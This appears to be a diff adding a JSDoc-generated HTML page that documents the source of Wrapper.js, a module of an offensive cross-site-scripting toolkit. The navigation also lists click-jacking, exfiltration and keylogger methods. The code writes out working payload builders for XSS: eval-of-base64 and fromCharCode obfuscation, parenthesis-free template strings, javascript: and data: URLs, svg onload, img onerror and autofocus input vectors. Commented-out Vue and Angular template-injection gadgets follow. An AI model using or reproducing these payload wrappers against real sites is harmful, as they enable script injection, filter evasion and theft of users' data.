@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Wrapper.js - Documentation</title>
+
+    <script src="scripts/prettify/prettify.js"></script>
+    <script src="scripts/prettify/lang-css.js"></script>
+    <script src="scripts/graphs.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+    <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
+
+    <link type="text/css" rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
+    <link type="text/css" rel="stylesheet" href="styles/prettify-tomorrow.css">
+    <link type="text/css" rel="stylesheet" href="styles/graph.css">
+    <link type="text/css" rel="stylesheet" href="styles/jsdoc-default.css">
+</head>
+<body>
+
+<input type="checkbox" id="nav-trigger" class="nav-trigger" />
+<label for="nav-trigger" class="navicon-button x">
+  <div class="navicon"></div>
+</label>
+
+<label for="nav-trigger" class="overlay"></label>
+
+<nav class="nav">
+    <h2><a href="index.html">Home</a></h2><h3>Modules</h3><ul><li><a href="module-utils.html">utils</a><ul class='methods'><li data-type='method'><a href="module-utils.html#.buildUrl">buildUrl</a></li><li data-type='method'><a href="module-utils.html#.createElement">createElement</a></li><li data-type='method'><a href="module-utils.html#.createFrame">createFrame</a></li><li data-type='method'><a href="module-utils.html#.loadUglify">loadUglify</a></li><li data-type='method'><a href="module-utils.html#.randInt">randInt</a></li></ul></li></ul><h3>Classes</h3><ul><li><a href="ClickJacker.html">ClickJacker</a><ul class='methods'><li data-type='method'><a href="ClickJacker.html#addStep">addStep</a></li><li data-type='method'><a href="ClickJacker.html#run">run</a></li></ul></li><li><a href="Exfiltrators.html">Exfiltrators</a><ul class='methods'><li data-type='method'><a href="Exfiltrators.html#.console">console</a></li><li data-type='method'><a href="Exfiltrators.html#.get">get</a></li><li data-type='method'><a href="Exfiltrators.html#.iframe">iframe</a></li><li data-type='method'><a href="Exfiltrators.html#.img">img</a></li><li data-type='method'><a href="Exfiltrators.html#.message">message</a></li><li data-type='method'><a href="Exfiltrators.html#.post">post</a></li><li data-type='method'><a href="Exfiltrators.html#.postJSON">postJSON</a></li><li data-type='method'><a href="Exfiltrators.html#.sendBeacon">sendBeacon</a></li><li data-type='method'><a href="Exfiltrators.html#.style">style</a></li></ul></li><li><a href="MessageHandler.html">MessageHandler</a><ul class='methods'><li data-type='method'><a href="MessageHandler.html#addListener">addListener</a></li><li data-type='method'><a href="MessageHandler.html#listen">listen</a></li><li data-type='method'><a href="MessageHandler.html#logMessages">logMessages</a></li><li data-type='method'><a href="MessageHandler.html#removeListener">removeListener</a></li><li data-type='method'><a href="MessageHandler.html#stop">stop</a></li><li data-type='method'><a href="MessageHandler.html#waitForMessage">waitForMessage</a></li></ul></li><li><a href="Payload.html">Payload</a><ul class='methods'><li data-type='method'><a href="Payload.html#.new">new</a></li><li data-type='method'><a href="Payload.html#addExfiltrator">addExfiltrator</a></li><li data-type='method'><a href="Payload.html#asDOM">asDOM</a></li><li data-type='method'><a href="Payload.html#eval">eval</a></li><li data-type='method'><a href="Payload.html#exfiltrate">exfiltrate</a></li><li data-type='method'><a href="Payload.html#fetch">fetch</a></li><li data-type='method'><a href="Payload.html#fetchDOM">fetchDOM</a></li><li data-type='method'><a href="Payload.html#fetchJSON">fetchJSON</a></li><li data-type='method'><a href="Payload.html#fetchText">fetchText</a></li><li data-type='method'><a href="Payload.html#findBetween">findBetween</a></li><li data-type='method'><a href="Payload.html#forEach">forEach</a></li><li data-type='method'><a href="Payload.html#guard">guard</a></li><li data-type='method'><a href="Payload.html#injectStyle">injectStyle</a></li><li data-type='method'><a href="Payload.html#log">log</a></li><li data-type='method'><a href="Payload.html#map">map</a></li><li data-type='method'><a href="Payload.html#parallel">parallel</a></li><li data-type='method'><a href="Payload.html#passthru">passthru</a></li><li data-type='method'><a href="Payload.html#persist">persist</a></li><li data-type='method'><a href="Payload.html#postMessage">postMessage</a></li><li data-type='method'><a href="Payload.html#postMultipart">postMultipart</a></li><li data-type='method'><a href="Payload.html#querySelector">querySelector</a></li><li data-type='method'><a href="Payload.html#querySelectorAll">querySelectorAll</a></li><li data-type='method'><a href="Payload.html#redirect">redirect</a></li><li data-type='method'><a href="Payload.html#regExtract">regExtract</a></li><li data-type='method'><a href="Payload.html#setExfiltrator">setExfiltrator</a></li><li data-type='method'><a href="Payload.html#startClickLogger">startClickLogger</a></li><li data-type='method'><a href="Payload.html#startKeyLogger">startKeyLogger</a></li><li data-type='method'><a href="Payload.html#wait">wait</a></li></ul></li><li><a href="Wrapper.html">Wrapper</a><ul class='methods'><li data-type='method'><a href="Wrapper.html#.new">new</a></li><li data-type='method'><a href="Wrapper.html#wrap">wrap</a></li></ul></li><li><a href="Wrapper_HTML.html">Wrapper_HTML</a><ul class='methods'><li data-type='method'><a href="Wrapper_HTML.html#append">append</a></li><li data-type='method'><a href="Wrapper_HTML.html#dataUrl">dataUrl</a></li><li data-type='method'><a href="Wrapper_HTML.html#dataUrl64">dataUrl64</a></li><li data-type='method'><a href="Wrapper_HTML.html#enclose">enclose</a></li><li data-type='method'><a href="Wrapper_HTML.html#iframe">iframe</a></li><li data-type='method'><a href="Wrapper_HTML.html#innerHTML">innerHTML</a></li><li data-type='method'><a href="Wrapper_HTML.html#prepend">prepend</a></li><li data-type='method'><a href="Wrapper_HTML.html#wrap">wrap</a></li><li data-type='method'><a href="Wrapper_HTML.html#write">write</a></li></ul></li><li><a href="Wrapper_HTMLDataUrl.html">Wrapper_HTMLDataUrl</a><ul class='methods'><li data-type='method'><a href="Wrapper_HTMLDataUrl.html#iframe">iframe</a></li><li data-type='method'><a href="Wrapper_HTMLDataUrl.html#windowOpen">windowOpen</a></li><li data-type='method'><a href="Wrapper_HTMLDataUrl.html#wrap">wrap</a></li></ul></li><li><a href="Wrapper_JS.html">Wrapper_JS</a><ul class='methods'><li data-type='method'><a href="Wrapper_JS.html#append">append</a></li><li data-type='method'><a href="Wrapper_JS.html#appendScript">appendScript</a></li><li data-type='method'><a href="Wrapper_JS.html#dataUrl">dataUrl</a></li><li data-type='method'><a href="Wrapper_JS.html#dataUrl64">dataUrl64</a></li><li data-type='method'><a href="Wrapper_JS.html#enclose">enclose</a></li><li data-type='method'><a href="Wrapper_JS.html#evalB64">evalB64</a></li><li data-type='method'><a href="Wrapper_JS.html#evalStringForCharCode">evalStringForCharCode</a></li><li data-type='method'><a href="Wrapper_JS.html#imgError">imgError</a></li><li data-type='method'><a href="Wrapper_JS.html#inputFocus">inputFocus</a></li><li data-type='method'><a href="Wrapper_JS.html#minify">minify</a></li><li data-type='method'><a href="Wrapper_JS.html#prepend">prepend</a></li><li data-type='method'><a href="Wrapper_JS.html#script">script</a></li><li data-type='method'><a href="Wrapper_JS.html#svgLoad">svgLoad</a></li><li data-type='method'><a href="Wrapper_JS.html#templateString">templateString</a></li><li data-type='method'><a href="Wrapper_JS.html#url">url</a></li><li data-type='method'><a href="Wrapper_JS.html#wrap">wrap</a></li></ul></li><li><a href="Wrapper_JSDataUrl.html">Wrapper_JSDataUrl</a><ul class='methods'><li data-type='method'><a href="Wrapper_JSDataUrl.html#script">script</a></li><li data-type='method'><a href="Wrapper_JSDataUrl.html#scriptImport">scriptImport</a></li><li data-type='method'><a href="Wrapper_JSDataUrl.html#wrap">wrap</a></li></ul></li><li><a href="Wrapper_JSUrl.html">Wrapper_JSUrl</a><ul class='methods'><li data-type='method'><a href="Wrapper_JSUrl.html#embed">embed</a></li><li data-type='method'><a href="Wrapper_JSUrl.html#iframe">iframe</a></li><li data-type='method'><a href="Wrapper_JSUrl.html#object">object</a></li><li data-type='method'><a href="Wrapper_JSUrl.html#redirect">redirect</a></li><li data-type='method'><a href="Wrapper_JSUrl.html#wrap">wrap</a></li></ul></li></ul>
+</nav>
+
+<div id="main">
+    
+    <h1 class="page-title">Wrapper.js</h1>
+    
+
+    <!--container.tmpl-->
+
+
+
+
+    <!--source.tmpl-->
+
+    <section>
+        <article>
+            <pre class="prettyprint source linenums"><code>import { repr } from "./utils.js"
+import Payload from "./Payload.js"
+
+
+
+/**
+ * @param {*} tag 
+ */
+function isSelfClosing(tag) {
+    // hacky way to determine if the element is self closing
+    return document.createElement(tag).outerHTML.match(/&lt;/g).length == 1
+}
+
+function dataUrl(value, mime = "", encoding = "") {
+    return `data:${mime};${encoding},${encodeURIComponent(value)}`
+}
+
+function dataUrl64(value, mime = "") {
+    return dataUrl(btoa(value), mime, "base64")
+}
+
+function jsUrl(value) {
+    return `javascript:${encodeURIComponent(value)}`
+}
+
+function createStringElement(tagName, attributes) {
+    // I use a fake element to prevent event from firing, like {src:"a", onerror:"alert"}
+    // I don't think you can trigger an event on a custom element not yet inserted to the DOM
+    const randomKey = Math.floor(Math.random() * 10e16).toString(16)
+    const tag = `_${randomKey}_`
+    const el = document.createElement(tag)
+    for (const [name, attribute] of Object.entries(attributes)) {
+        el.setAttribute(name, attribute)
+    }
+    let html = el.outerHTML
+    if (isSelfClosing(tagName)) {
+        // strip the closing tag + html markup >&lt;/TAG>
+        // and fix the closing markup
+        html = html.slice(0, -(tag.length + 4)) + "/>"
+    }
+    return html.replace(new RegExp(tag, "g"), tagName)
+}
+
+
+
+
+/**
+ * Used to wrap your {@link Payload}
+ * @class 
+ * @property {Wrapper | null} parent
+ * @property {Function | null} wrapper
+ * @property {String | null} payload
+ * 
+ */
+class Wrapper {
+    /**
+     * 
+     * Used internally&lt;br>
+     * Use [Wrapper.new]{@link Wrapper.new} instead.
+     * 
+     * @param {Wrapper} parent The parent wrapper
+     * @param {function} wrapper The actual wrapper function
+     */
+    constructor(parent = null, wrapper = null) {
+        this.parent = parent
+        this.wrapper = wrapper
+    }
+    /**
+     * Create a [Wrapper_JS]{@link Wrapper_JS} Object
+     
+     * @graph ($current) {} -> $Wrapper_JS
+     * @return {Wrapper_JS}
+     */
+    static new(){
+        return new Wrapper_JS()
+    }
+
+    /**
+     * Wrap a payload or a string and return it a as string
+     * 
+     * @param {Payload | String} payload Payload to wrap
+     * @example
+     * 
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new()
+     * const code = w.wrap(p)
+     * 
+     * eval(code)
+     * @graph $Wrapper -> {} ($current) {} -> {} (String)
+     * @return {string}
+     */
+    wrap(payload) {
+        const code = payload instanceof Payload ? payload.run() : payload.toString()
+        return this._compile(code)
+    }
+
+    _compile(payload) {
+        const code = this.parent ? this.parent._compile(payload) : payload
+        return this.wrapper ? this.wrapper(code) : code
+    }
+
+
+}
+/**
+ * Represent a payload in javascript format
+ * @augments Wrapper
+ * @alias Wrapper_JS
+ * @class 
+ * @inheritdoc
+ */
+class Wrapper_JS extends Wrapper {
+    /**
+     * Transform any js code into a template string payload without parenthesis.
+     * 
+     * 
+     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_JS
+     * @example
+     * 
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().templateString()
+     * const c = w.wrap(p)
+     * 
+     * eval(c)
+     * @returns {Wrapper_JS}
+     */
+    templateString() {
+        return new Wrapper_JS(this, code => `Function\`_\${atob\`${btoa(code)}\`}\`\`\``)
+    }
+
+    /**
+     * Transform any js code into an eval(atob()) payload.
+     * 
+     * 
+     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_JS
+     * @example
+     * 
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().evalB64()
+     * const c = w.wrap(p)
+     * 
+     * eval(c)
+     * @returns {Wrapper_JS} 
+     */
+    evalB64() {
+        return new Wrapper_JS(this, code => `eval(atob(${repr(btoa(code))}))`)
+    }
+
+    /**
+     * Transform any js code into an eval(String.fromCharCode(42, 42, ...)) payload.
+     * 
+     * 
+     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_JS
+     * @example
+     * 
+     * const p = Payload.new().evalStringForCharCode(() => alert(1))
+     * const w = Wrapper.new().evalB64()
+     * const c = w.wrap(p)
+     * 
+     * eval(c)
+     * @returns {Wrapper_JS} 
+     */
+    evalStringForCharCode() {
+        return new Wrapper_JS(this, code => `eval(String.fromCharCode(${Array.from(code).map(x=>x.charCodeAt(0)).join(",")}))`)
+    }
+
+    /**
+     * Transform any js code into a javascript: pseudo url.
+     * 
+     * 
+     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_JSUrl
+     * @example
+     * 
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().url()
+     * 
+     * document.location = w.wrap(p)
+     * @returns {Wrapper_JSUrl} 
+     */
+    url() {
+        return new Wrapper_JSUrl(this, code => jsUrl(code))
+    }
+
+    /**
+     * Transform any js code into a data: base64 encoded pseudo url.
+     * 
+     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_JSDataUrl
+     * @example
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().dataUrl64()
+     * 
+     * const s = document.createElement('script')
+     * s.src = w.wrap(p)
+     * document.body.appendChild(s)
+     * @returns {Wrapper_JSDataUrl} 
+     */
+    dataUrl64() {
+        return new Wrapper_JSDataUrl(this, code => dataUrl64(code, "application/javascript"))
+    }
+
+    /**
+     * Transform any js code into a data: pseudo url.
+     * 
+     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_JSDataUrl
+     * @example
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().dataUrl()
+     * 
+     * const s = document.createElement('script')
+     * s.src = w.wrap(p)
+     * document.body.appendChild(s)
+     * @returns {Wrapper_JSDataUrl} 
+     */
+    dataUrl() {
+        return new Wrapper_JSDataUrl(this, code => dataUrl(code, "application/javascript"))
+    }
+    
+    /**
+     * Transform any js code into a &amp;ltscript&amp;gt element.
+     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_HTML
+     * @example
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().script()
+     * 
+     * const i = document.createElement('iframe')
+     * s.srcdoc = w.wrap(p)
+     * document.body.appendChild(i)
+     * @returns {Wrapper_HTML} 
+     */
+    script() {
+        return new Wrapper_HTML(this, code => {
+            return `&lt;script>${code.replace(/&lt;\/script>/g, "&lt;\\/script>")}&lt;/script>`
+        })
+    }
+
+    /**
+     * Transform any js code into an document.appendChild(script) payload.
+     * @param {string} [selector="body"] Css selector for the parent element
+     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_JS
+     * @example
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().appendScript()
+     * const c = w.wrap(p)
+     * 
+     * eval(c)
+     * @returns {Wrapper_JS} 
+     */
+    appendScript(selector = "body") {
+        return new Wrapper_JS(this, code => `document.querySelector(${repr(selector)}).appendChild(Object.assign(document.createElement("script"), {innerHTML: ${repr(code)}}))`)
+    }
+
+    event(tag, eventName) {
+        return new Wrapper_HTML(this, code => createStringElement(tag, { [eventName]: code }))
+    }
+
+    /**
+     * Transform any js code into a &amp;lt;svg onload&amp;gt; payload.
+     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_HTML
+     * @example
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().svgLoad()
+     * 
+     * document.body.innerHTML = w.wrap(p)
+     * @returns {Wrapper_HTML} 
+     */
+    svgLoad() {
+        return new Wrapper_HTML(this, code => createStringElement('svg', { onload: code }))
+    }
+
+    /**
+     * Transform any js code into a &amp;lt;img onerror&amp;gt; payload.
+     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_HTML
+     * @example
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().imgError()
+     * 
+     * document.body.innerHTML = w.wrap(p)
+     * @returns {Wrapper_HTML} 
+     */
+    imgError() {
+        return new Wrapper_HTML(this, code => createStringElement('img', { src: "x:", alt: "", onerror: code }))
+    }
+
+    /**
+     * Transform any js code into a &amp;lt;input onfocus&amp;gt; payload.
+     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_HTML
+     * @example
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().inputFocus()
+     * 
+     * document.body.innerHTML = w.wrap(p)
+     * @returns {Wrapper_HTML} 
+     */
+    inputFocus() {
+        return new Wrapper_HTML(this, code => createStringElement('input', { autofocus: "true", onfocus: code }))
+
+    }
+    /**
+     * Minify the js code with uglify-js
+     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_JS
+     * @example
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().minify()
+     * 
+     * eval(w.wrap(p))
+     */
+    minify(){
+        if (!window.minify){
+            throw Error("uglify-js is not available, use utils.loadUglify() before calling this function.")
+        }
+        return new Wrapper_JS(this, code => window.minify(code).code)
+    }
+    /**
+     * Add a prefix to a payload
+     * @param {String} prefix Prefix to add to the current payload 
+     * @graph $Wrapper_JS -> {} ($current) {} -> $Wrapper_JS
+     * @returns {Wrapper_JS}
+     */
+    prepend(prefix){
+        return new Wrapper_JS(this, code => `${prefix}${code}`)
+    }
+    /**
+     * Add a sufix to a payload
+     * @param {String} sufix Sufix to add to the current payload 
+     * @graph $Wrapper_JS -> {} ($current) {} -> $Wrapper_JS
+     * @returns {Wrapper_JS}
+     */
+    append(sufix){
+        return new Wrapper_JS(this, code => `${code}${sufix}`)
+
+    }
+    /**
+     * Add a prefix and a sufix to a payload
+     * @param {String} prefix Prefix to add to the current payload 
+     * @param {String} sufix Sufix to add to the current payload 
+     * @graph $Wrapper_JS -> {} ($current) {} -> $Wrapper_JS
+     * @returns {Wrapper_JS}
+     */
+    enclose(prefix, sufix){
+        return this.prepend(prefix).append(sufix)
+    }
+}
+
+
+/**
+ * Represent a payload in javascript: url format
+ * @augments Wrapper
+ * @alias Wrapper_JSUrl
+ * @class
+ * @inheritdoc
+ */
+class Wrapper_JSUrl extends Wrapper {
+    /**
+     * Transform any javascript url into a &amp;lt;iframe src&amp;gt; payload.
+     * @example
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().url().iframe()
+     * 
+     * document.body.innerHTML = w.wrap(p)
+     * @returns {Wrapper_HTML} 
+     */
+    iframe() {
+        return new Wrapper_HTML(this, code => createStringElement('iframe', { src: code }))
+    }
+
+    /**
+     * Transform any javascript url into a &amp;lt;object src&amp;gt; payload.
+     * @graph  $Wrapper_JSUrl -> {} ($current) {} -> $Wrapper_HTML
+     * @example
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().url().object()
+     * 
+     * document.body.innerHTML = w.wrap(p)
+     * @returns {Wrapper_HTML} 
+     */
+    object() {
+        return new Wrapper_HTML(this, code => createStringElement('object', { data: code }))
+    }
+
+    /**
+     * Transform any javascript url into a &amp;lt;embed src&amp;gt; payload.
+     * @graph  $Wrapper_JSUrl -> {} ($current) {} -> $Wrapper_HTML
+     * @example
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().url().embed()
+     * 
+     * document.body.innerHTML = w.wrap(p)
+     * @returns {Wrapper_HTML} 
+     */
+    embed() {
+        return new Wrapper_HTML(this, code => createStringElement('embed', { data: code }))
+    }
+
+    /**
+     * Transform any javascript url into a javascript redirect payload.
+     * @graph  $Wrapper_JSUrl -> {} ($current) {} -> $Wrapper_JS
+     * @example
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().url().Wrapper_JS()
+     * const c = w.wrap(p)
+     * 
+     * eval(c)
+     * @returns {Wrapper_JS} 
+     */
+    redirect() {
+        return new Wrapper_JS(this, code => `window.location=${repr(code)}`)
+    }
+}
+
+/**
+ * Represent a javascript payload in data: url format
+ * @augments Wrapper
+ * @alias Wrapper_JSDataUrl
+ * @class
+ * @inheritdoc
+ */
+class Wrapper_JSDataUrl extends Wrapper {
+    /**
+     * Transform any javascript data url into a &amp;lt;script src&amp;gt; payload.
+     * @graph  $Wrapper_JSDataUrl -> {} ($current) {} -> $Wrapper_HTML
+     * @example
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().dataUrl().script()
+     * 
+     * const i = document.createElement('iframe')
+     * s.srcdoc = w.wrap(p)
+     * document.body.appendChild(i)
+     * @returns {Wrapper_HTML} 
+     */
+    script() {
+        return new Wrapper_HTML(this, code => createStringElement('script', { src: code }))
+    }
+    /**
+     * Transform any javascript data url into a &amp;lt;script src&amp;gt; import payload.
+     * @graph  $Wrapper_JSDataUrl -> {} ($current) {} -> $Wrapper_HTML
+     * @example
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().dataUrl().scriptImport()
+     * 
+     * const i = document.createElement('iframe')
+     * s.srcdoc = w.wrap(p)
+     * document.body.appendChild(i)
+     * @returns {Wrapper_HTML} 
+     */
+    scriptImport() {
+        return new Wrapper_HTML(this, code => `&lt;script>import(${repr(code)})&lt;/script>`)
+    }
+
+
+}
+
+/**
+ * Represent an HTML payload in data: url format
+ * @augments Wrapper
+ * @alias Wrapper_HTMLDataUrl
+ * @class
+ * @inheritdoc
+ */
+class Wrapper_HTMLDataUrl extends Wrapper {
+    /**
+     * Transform any html data url into a &amp;lt;iframe src&amp;gt; payload.&lt;br>
+     * &lt;b> The XSS will trigger on about:blank&lt;/b>
+     * @graph  $Wrapper_HTMLDataUrl -> {} ($current) {} -> $Wrapper_HTML
+     * @example
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().script().dataUrl().iframe()
+     * 
+     * document.body.innerHTML = w.wrap(p)
+     * @returns {Wrapper_HTML} 
+     */
+    iframe() {
+        return new Wrapper_HTML(this, code => createStringElement('iframe', { src: code }))
+    }
+
+    /**
+     * Transform any html data url into a window.open payload.&lt;br>
+     * &lt;b> The XSS will trigger on about:blank&lt;/b>
+     * @graph  $Wrapper_HTMLDataUrl -> {} ($current) {} -> $Wrapper_JS
+     * @example
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().script().dataUrl().windowOpen()
+     * 
+     * document.body.innerHTML = w.wrap(p)
+     * @returns {Wrapper_JS} 
+     */
+    windowOpen() {
+        return new Wrapper_JS(this, code => `window.open(${repr(code)})`)
+    }
+}
+
+/**
+ * Represent a payload in HTML format
+ * @augments Wrapper
+ * @alias Wrapper_HTML
+ * @class
+ * @inheritdoc
+ */
+class Wrapper_HTML extends Wrapper {
+    /**
+     * Transform any html into a &amp;lt;iframe srcdoc&amp;gt; payload.
+     * @graph  $Wrapper_HTML -> {} ($current) {} -> $Wrapper_HTML
+     * @example
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().script().iframe()
+     * 
+     * document.body.innerHTML = w.wrap(p)
+     * @returns {Wrapper_HTML} 
+     */
+    iframe() {
+        return new Wrapper_HTML(this, code => createStringElement('iframe', { srcdoc: code }))
+    }
+
+    /**
+     * Transform any html into a document.write payload.
+     * @graph  $Wrapper_HTML -> {} ($current) {} -> $Wrapper_JS
+     * @example
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().script().write()
+     * const c = w.wrap(p)
+     * 
+     * eval(c)
+     * @returns {Wrapper_JS} 
+     */
+    write() {
+        return new Wrapper_JS(this, code => `document.write(${repr(code)})`)
+    }
+
+    /**
+     * Transform any html into a el.innerHTML= payload.
+     * @param {string} [target="body"] CSS selector for the parent element.
+     * @graph  $Wrapper_HTML -> {} ($current) {} -> $Wrapper_JS
+     * @example
+     * const p = Payload.new().eval(() => alert(1))
+     * const w = Wrapper.new().script().innerHTML()
+     * const c = w.wrap(p)
+     * 
+     * eval(c)
+     * @returns {Wrapper_JS} 
+     */
+    innerHTML(target = "body") {
+        return new Wrapper_JS(this, code => `document.querySelector(${repr(target)}).innerHTML = ${repr(code)}`)
+    }
+
+    /**
+     * Transform any html into a data url base64 encoded payload.
+     * @graph  $Wrapper_HTML -> {} ($current) {} -> $Wrapper_HTMLDataUrl
+     * @returns {Wrapper_HTMLDataUrl} 
+     */
+    dataUrl64() {
+        return new Wrapper_HTMLDataUrl(this, code => dataUrl64(code, "text/html"))
+    }
+
+    /**
+     * Transform any html into a data url payload.
+     * @returns {Wrapper_HTMLDataUrl} 
+     * @graph  $Wrapper_HTML -> {} ($current) {} -> $Wrapper_HTMLDataUrl
+     */
+    dataUrl() {
+        return new Wrapper_HTMLDataUrl(this, code => dataUrl(code, "text/html"))
+    }
+
+
+    /**
+     * Add a prefix to a payload
+     * @param {String} prefix Prefix to add to the current payload 
+     * @graph $Wrapper_HTML -> {} ($current) {} -> $Wrapper_HTML
+     * @returns {Wrapper_HTML}
+     */
+    prepend(prefix){
+        return new Wrapper_HTML(this, code => `${prefix}${code}`)
+    }
+    /**
+     * Add a sufix to a payload
+     * @param {String} sufix Sufix to add to the current payload 
+     * @graph $Wrapper_HTML -> {} ($current) {} -> $Wrapper_HTML
+     * @returns {Wrapper_HTML}
+     */
+    append(sufix){
+        return new Wrapper_HTML(this, code => `${code}${sufix}`)
+
+    }
+    /**
+     * Add a prefix and a sufix to a payload
+     * @param {String} prefix Prefix to add to the current payload 
+     * @param {String} sufix Sufix to add to the current payload 
+     * @graph $Wrapper_HTML -> {} ($current) {} -> $Wrapper_HTML
+     * @returns {Wrapper_HTML}
+     */
+    enclose(prefix, sufix){
+        return this.prepend(prefix).append(sufix)
+    }
+}
+export default Wrapper
+
+/*
+
+    vue3() {
+        return new Wrapper(this, code => `{{_openBlock.constructor('${code.replace(/'/g, "\\'")}')()}}`)
+    }
+
+    vue2() {
+        return new Wrapper(this, code => `{{constructor.constructor('${code.replace(/'/g, "\\'")}')()}}`)
+    }
+
+    angular() {
+        return new Wrapper(this, code => `{{constructor.constructor('${code.replace(/'/g, "\\'")}')()}}`)
+    }
+*/</code></pre>
+        </article>
+    </section>
+
+
+
+
+
+</div>
+
+<br class="clear">
+
+<footer>
+    Documentation generated by <a href="https://github.com/jsdoc3/jsdoc">JSDoc 3.6.6</a> on Sun Mar 14 2021 13:45:10 GMT+0100 (Central European Standard Time) using the LOKE theme.
+</footer>
+
+<script>prettyPrint();</script>
+<script src="scripts/linenumber.js"></script>
+<script>window.addEventListener("DOMContentLoaded", initGraphs)</script>
+</body>
+</html>
